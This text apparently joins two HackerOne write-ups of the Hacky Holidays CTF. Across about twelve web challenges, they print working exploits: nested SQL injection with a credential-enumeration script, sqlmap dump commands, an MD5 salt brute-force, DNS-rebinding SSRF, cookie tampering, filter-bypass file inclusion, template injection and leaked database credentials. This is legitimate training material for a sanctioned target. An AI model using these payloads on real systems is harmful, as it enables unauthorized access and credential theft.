One thing is that we need to find valid endpoint to make requests.After guessing multiple endpoints, the following endpoint seems to be valid bocz it response with "Invalid content type detected" .Normally if we make request to invalid endpoint the server responses us with 404.
Code 652 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/lol\"--+-","2","3"--+-
2
3{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/lol","auth":"494c095363e0f1a99e1c869887522c62"}
4
5https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2xvbCIsImF1dGgiOiI0OTRjMDk1MzYzZTBmMWE5OWUxYzg2OTg4NzUyMmM2MiJ9
6
7Expected HTTP status 200, Received: 404
8
9https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user\"--+-","2","3"--+-
10
11Invalid content type detected
By using the same method, we can guess the parameters either and found username and password.
Code 603 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?test=lol\"--+-","2","3"--+-
2
3Expected HTTP status 200, Received: 400 Bad Request
4
5https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=lol\"--+-","2","3"--+-
6
7Expected HTTP status 200, Received: 204
8
9https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?password=lol\"--+-","2","3"--+-
10
11Expected HTTP status 200, Received: 204
So far, we have valid api endpoint and parameters either, now final step is to get valid username and password.
In this case, we can use sql wildcard character (% , _ ) to enumerate username and password.Let's see how it works.
Firstly , let's confrim how many length has username and password.
Code 1.15 KiB
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )
2
3Expected HTTP status 200, Received: 204
4
5https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )
6
7Invalid content type detected
8
9https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=____________%\"--+-","2","3"--+-  ( 12 underscores )
10
11Expected HTTP status 200, Received: 204
12
13OK so username has 10 characters, let's see about passoword
14
15https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )
16
17Invalid content type detected
18
19https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )
20
21Expected HTTP status 200, Received: 204
Now we're able to identify that username has 11 characters and password has 10 characters.
In order to extract username and password, I made a lazy script to automate these steps.
Code 1.01 KiB
1#!/usr/bin/python3
2import requests
3from urllib.request import urlopen
4from bs4 import BeautifulSoup
5import string
6import numpy as np
7
8alphabet = list(string.ascii_lowercase)
9number = list(range(0,10))
10fuzz = np.concatenate((alphabet,number))
11username = ""
12while len(username) < 11:
13	for i in fuzz:
14		i = username + i
15		payload = "lol%20%27%20UNION%20SELECT%20%221%27%20union%20select%20\%221\%22,\%222\%22,\%22../api/user?username={}%\%22--+-%22,%222%22,%223%22--+-".format(i)
16		url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash={}".format(payload)
17		req = urlopen(url)
18		bs = BeautifulSoup(req.read(), 'html.parser')
19		response = bs.find_all('img',class_='img-responsive')
20		img_data = response[2]
21		sec_req =requests.get("https://hackyholidays.h1ctf.com"+img_data['src'])
22		response_txt = sec_req.text
23		if "Invalid content type detected" not in response_txt:
24			continue
25		else:
26			username = username + i[-1]
27			print("Found valid character: "+i)
28			break
29else:
30	print("Here's the final username: "+username)
Run the script and get the valid username : grinchadmin
<image_13>
For the password, we can either use above script by making a little changes
<image_14>
Now, simply login into attack-box and find the flag.
https://hackyholidays.h1ctf.com/attack-box/login
<image_15>
Flag 11 -: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Day 12 - Grinch Network Attack Server
As it's saying ,
"We've identified Santa's key servers and loaded them into the attack server ready for you to take down"
We're supposed to "take down the Grinch networks" in order to get the flag and we need to find a way.
Once we try to attack the server, the browser sent the request with uniqe hash for each ip.
Code 219 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
2
3{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
If we try to change the target ip to something else like 127.0.0.1,
Code 191 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=
2
3Got the response
4
5"Invalid Protection Hash"
So we need to find out how server identifies the valid hash along with target ip.
I stucked there for hours and falied multiple attempts but finally I fingured it out that there's a salt which is being used to generate valid hash for target ip address.Here's the code how we can find valid salt.
Code 421 Bytes
1#!/usr/bin/python3
2import hashlib 
3fuzz = [line.rstrip('\n') for line in open('rockyou.txt')]
4for i in fuzz:
5	#{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
6	  target =  i + "203.0.113.33"
7	  target_hash = "5f2940d65ca4140cc18d0878bc398955"
8	  generate_hash = hashlib.md5(target.encode())
9	  md5 = str(generate_hash.hexdigest())
10	  if target_hash == md5:
11	  	print("Here's valid salt: "+i)
12	  	break
It will take a while and once we get the salt -: mrgrinch463, we can generate valid hash for every ip address.
Tried to attack local host 127.0.0.1 but it didnt't success due to restriction.
<image_16>
But it's possible to trick the server by using DNS Rebinding technique, after searching a while , found this rdnr repo which we can use to bypass.By checking with host cmmand,
7f000001.c0a80001.rbndr.us resolves to 127.0.0.1 and 192.168.0.1 randomly.
Let's see does it work.
Code 364 Bytes
1{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}    >  eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiI2MTQyMmI4MDJhMWQ2ZGRlZDJjZDdhNGNmYTgyYTExMiJ9
2
3https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
By making above request, once we hit to grinch's local box, we could take down his network completely and got the flag!!!!!
<image_17>
Flag 12 -: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Thanks for providing awesome ctf, learned a lots.
Impact
..



==================================================

Report File: 1067037.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Hi thank you Hackerone and Adam for organizing the CTF, this had honestly helped me to learn good skills and techniques.
The CTF began with the scope: hackyholidays.h1ctf.com and mission to take down grinch
So here's a quick visual summary of all the challenges
<image_0>
# 1. Grinch Robots
In this challenge we needed to find grinch robots, opening the robots.txt file destroyed the robots and gave us flags
Steps to reproduce:
Go to https://hackyholidays.h1ctf.com/robots.txt
In the page you would find the flag
Grinch RobotsDown
flag{48104912-28b0-494a-9995-a203d1e261e7}
# 2. s3cr3t-ar3a
In this challenge, we had got a clue from robots.txt about a page s3cr3t-ar3a, Upon visiting the page we see that it displayed page was moved to other location but Grinch forgot about the page source which had jquery.min.js that held the flag in order to get the flag we needed to merge all the pieces which could be easily done from Chrome dev-tools.
Steps:
Go to https://hackyholidays.h1ctf.com/s3cr3t-ar3a and view page source
In there we can see a js file named jquery.min.js
Use a beautifier to easily see contents and now copy the variables from h1_0='la',h1_1='}',h1_2='',h1_3='f',h1_4='g',h1_5='{b7ebcb75',h1_6='8454-',h1_7='cfb9574459f7',h1_8='-9100-4f91-'
In chrome dev console paste this and then enter h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 this will reveal the flag
Grinch Secrets Exposed
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
# 3. People Rater
Grinch has rated people with a lot of hate but he forgot that by mistake he rated himself and hid the secrets in his ratings,
when we click on any person ratings we observe that to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= a request is made to fetch every person ratings the id= value is base64 encoded, on the page value starts from {"id":2} to {"id":17} replacing this value with {"id":1} base64 i.e eyJpZCI6MX0= gave the flag
Steps to reproduce:
Go to https://hackyholidays.h1ctf.com/people-rater, press any name, and observe the background request in burp
The request looks like
Code 48 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Here upon decoding this value it gives {"id":2}, hmm strange starting value with 2
So i tried {"id":1} encoded eyJpZCI6MX0= and send request again
<image_1>
Code 222 Bytes
1Request
2https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
3
4Response:
5{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
6
3.Grinch Rater Down
### flag{b705fb11-fb55-442f-847f-0931be82ed9a}
# 4.Grinch Swag-Shop
Soon after this attack grinch launched his swag shop to ruin the fun, the shop only allowed to access via login at first look after fuzzing a bit I found that the swag-shop was built with API's also so I used my API wordlist for directories fuzzing which gave out /session & /user, session here gave us session values of users {"user,"cookie"} values only among them one had user value since accessing /user was giving missing required field I fuzzed /user with ARJUN and got uuid as a parameter so I sent a request as /api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 which gave the flag
Steps:
Go to https://hackyholidays.h1ctf.com/swag-shop/api
Now launch the API requests we retrieve flag as shown below
Code 4.14 KiB
1REQUEST1
2https://hackyholidays.h1ctf.com/swag-shop/api/sessions
3
4RESPONSE1
5
6{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
7
8DECODED
9
10{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}","{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}","{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}","{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}","{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}","{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}","{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}","{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}
11
12REQUEST2
13https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
14
15RESPONSE2
16{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
17
3.Grinch Shop Down
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
# 5.Secure Login
After Grinch swag shop was taken down through Api he immediately stopped the Api and added only password-based login which he thought was secure we took it down by common Bruteforce list which was listed on Adam's website ctfchallenge.co.uk, after logging in we found cookie was checking if a user is an admin or not we changed it to true by which we could see a file which was protected by a password but we break into in seconds through frackzip
Steps:
Go to the login page and enter any username password and send it to the intruder now add only the username field.
<image_2>
Now we use a common password list through which we get computer as password
After login we see a blank page but observing cookies
<image_3>
Code 298 Bytes
1eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
2{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
3we changed it to 
4{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
5eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
<image_4>
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
# 6. Grinch Diary
Grinch had changed his systems and he's now taking a new diary for writing all the bad works he will do, grinch protected secret files through so its not in our access
Here as soon as we opened the https://hackyholidays.h1ctf.com/my-diary/ the page automatically appended template=entries.html hmm interesting i was using wappalyzer which indicated the page is using PHP so I tried with index.php and gave a blank page upon viewing its source got the code which revealed that our flag was in secretadmin.php since it would not allow directly to access this due to check
Code 263 Bytes
1$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
2    //protect admin.php from being read
3    $page = str_replace("admin.php","",$page);
4    //I've changed the admin file to secretadmin.php for more security!
5    $page = str_replace("secretadmin.php","",$page);
So I prepared a value secretadmsecretadmadmin.phpin.phpin.php which upon 1st check would leave secretadmsecretadmin.phpin.php & on second check would give us secretadmin.php
Steps:
Go to https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php
<image_5>
Burned Grinch Diary
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
# 7. Hate-Emails
Grinch now came back with a new app which would send hate emails to others he has a special header which only he could include thats what he thinks but he missed to protect the template data check as preview data was lacking check through which we included the header and accessed his mail secrets
On the url https://hackyholidays.h1ctf.com/hate-mail-generator/ a quick directory search gave us /templates/ which had 3 entries
Code 297 Bytes
1cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
2cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
338dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
4
out of which 38dhs_admins_only_header.html was forbidden to access if we try to include that in markdown as {{template:38dhs_admins_only_header.html}} this would also not work and give response as You do not have access to the file 38dhs_admins_only_header.html . The request body that was going contained
Code 112 Bytes
1preview_markup=hIII{{template:cbdj3_grinch_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
Since insertion was not possible directly in preview_markup i tried inserting admin header in preview_data as
Code 115 Bytes
1preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}
Steps:
Open the url https://hackyholidays.h1ctf.com/hate-mail-generator/new/ and click on preview
Now intercept the request and replace preview data with preview_data={"name":"{{template:38dhs_admins_only_header.html}}
<image_6>
Hate Mailing Down
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
# 8. Grinch Forum
Grinch upon seeing his mistakes now decided to supersecure his new idea and built a forum for publishing his bad ideas but he was also clever enough to expose some secrets on github and burn himself again.
<image_7>
which was of phpmyadmin forum','6HgeAZ0qC9T6CQIqJpD upon login he see a user grinch hash 35D652126CA1706B59DB02C93E0C9FBF then i used crackstation to decode the password of grinch which came as BahHumbug
<image_8>
and now when we login we get the secret plans post which upon opening gave the flag
Steps:
Go to https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
Copy the dbconnect credentials forum','6HgeAZ0qC9T6CQIqJpD and login to https://hackyholidays.h1ctf.com/forum/phpmyadmin
In phpmyadmin see the users table we can see grinch password hash 35D652126CA1706B59DB02C93E0C9FBF
Now copy the hash and paste in https://crackstation.net/ this will give password as BahHumbug
<image_9>
~~ Forum Closed~~
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
# 9. Evil-Quiz
Grinch came with a new app called evil-quiz the app would require you to input your name and then ask questions and at the end tell level of your evilness but he was foolish as he did not used parameterized queries
<image_10>
Steps:
First enter open the quiz and copy cookie value
python sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" --dbs"
Code 202 Bytes
1
23.This will output as ```quiz``` as a database next for tables we add  --tables -D quiz  to know table name , tebale name of our interest was ```admin```
34.Now to fully dump this quiz database we fire
4
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" -T admin -D quiz --dump
Code 1.59 KiB
1Username-admin
2Password:S3creT_p4ssw0rd-$
3
4{F1131384}
55.After Login we get the flag
6{F1131389}
76.~~Lock Evil-Quiz~~
8
9### flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
10
11# 10.Signup Manager
12Grinch launched a signup manager but this time he exposed the source code which helped to find the overflow flaw in input fields and helped to become an admin to get the flag
13
14On visiting the page in source we can see mention of  ```<!-- See README.md for assistance -->``` when we downlaoded [Readme.md](https://hackyholidays.h1ctf.com/signup-manager/README.md{ it was an install guide for this app 
15{F1131401} 
16so this mentioned to unzip signupmanager.zip which was the source code as we downloaded it we can see all the files but the interesting one was index.php as it holded the logic for signup and admin check, as we could see during signup 
17
18{F1131402}
19'N' is automatically appended to line to prevent from user becoming admin if we check 
20{F1131426} 
21we can see to check wheter a user is admin or not line 113 is checked for Y value if its there then admin access will be granted so we need to pass Y somehow to line 113 the way it can be done here is overflowing age value with exponential value such as 1e9 which equals to 1,000,000,000 since this would feed into line 79 to 89 taking 10 characters note during signup firstname and lastname are given 15 chars limit so 89+30=119 so now we can easily add Y at line 113 just we need to send lastname as YYYYYYYYY and adjust other chars such that line 113 becomes Y.
22
23## Steps:
241. Go to https://hackyholidays.h1ctf.com/signup-manager/
252. Now enter the following payload as request body
26
action=signup&username=adminbb&password=adminbb&age=1e9&firstname=YYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYY
Code 650 Bytes
13.We get access to flag and next chall url
2
3{F1131432}
4
5### flag{99309f0f-1752-44a5-af1e-a03e4150757d}
6
7
8
9# 11. Grinch Double Evil
10Grinch became double evil by launching the new app at  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 he tricked the people to believe at first layer injection with rabbit hole but deep down he couldnt protect api and login credentials.
11
12
13This was the most fun and new learning experience for me at first look we see three Xmas albums request goes to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash= here we had three values and for each value when a request goes image data is returned in form of 
14
/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
Code 57 Bytes
1
2then a  url is then queried again  to fetch that image 
3
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
Code 399 Bytes
1At first when we tried
2After fuzzing with directory search we got /api/
3{F1131456} but at this point we really didnt have ideas how to use except get  a response that we cannot visit from our IP after trying an SQL Injection on 
4https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=  i was like yes but here this single injection was a rabbit hole and didnt returned any useful data only 
5
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash | name |
+----+--------+-----------+
| 1 | 3dir42 | Xmas 2018 |
| 2 | 59grop | Xmas 2019 |
| 3 | jdh34k | Xmas 2020 |
+----+--------+-----------+
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo |
+----+----------+--------------------------------------+
| 1 | 1 | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2 | 1 | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3 | 2 | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4 | 3 | db507bdb186d33a719eb045603020cec.jpg |
| 5 | 3 | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6 | 3 | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
Code 248 Bytes
1
2So after a bit waiting at a dead end ,in discord Adam dropped a hint {F1131463} this was from INCEPTION here this meant of  a double dream sequence and clearly for our challenge this meant for SQL Injection as double SQL injection so i tried with
3
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'1'='0",NULL,"test'"--+-
Code 28 Bytes
1returns only two rows while 
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'0'='0",NULL,"test'"--+-
Code 104 Bytes
1
2returned all the rows now we now needed to include with file names so as test we try /api/  /api/test/
3
/api/ Req-a https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=6860'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/\"--+-",NULL,"test'"--+- Req-b https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
Response : Invalid content type detected
/api/test/ https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/test\"--+-",NULL,"test'"--+-
Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3Rlc3QiLCJhdXRoIjoiOWQ0M2MwMDQ4MjMzNWFiYzhjZmRmNjM3YzAwNWJkZDYifQ==
Response: Expected HTTP status 200, Received: 404
Code 393 Bytes
1
2So here now we need to fuzz the /api/  i have used 2 files for [ files](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) and [parameters](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt)
3since this could not be done by any tool in my knowledge i used a simple python script as:
4
payloads=open('apiwordlist.txt',"r")
sql1='''33230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/'''
sql2='''\"--+-",NULL,"test'"--+-'''
url='https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=+sql1+payloads+sql2'
t1=requests.get(url).text
searchdata=re.search("data=(.cL3VwbG9hZHNcLy.)\"", t1).group(1)
